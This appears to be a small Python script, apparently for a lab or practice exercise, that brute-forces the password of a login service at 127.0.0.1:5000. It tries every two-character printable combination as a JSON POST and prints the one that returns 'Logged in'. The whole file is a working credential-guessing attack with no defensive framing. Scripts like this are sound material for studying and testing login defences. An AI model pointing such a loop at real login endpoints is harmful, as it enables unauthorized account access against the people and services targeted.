import requests
import string

def genCombinations():
    asciiLetters = string.printable
    for letter1 in asciiLetters:
        for letter2 in asciiLetters:
            yield (letter1 + letter2)


passwordCombination = genCombinations()

for combination in passwordCombination:
    r = requests.post('http://127.0.0.1:5000/', json={"password": combination})
    if(r.json()['Message'] == "Logged in"):
        print(combination)
        break 
    else:
        print('Trying: ' + combination)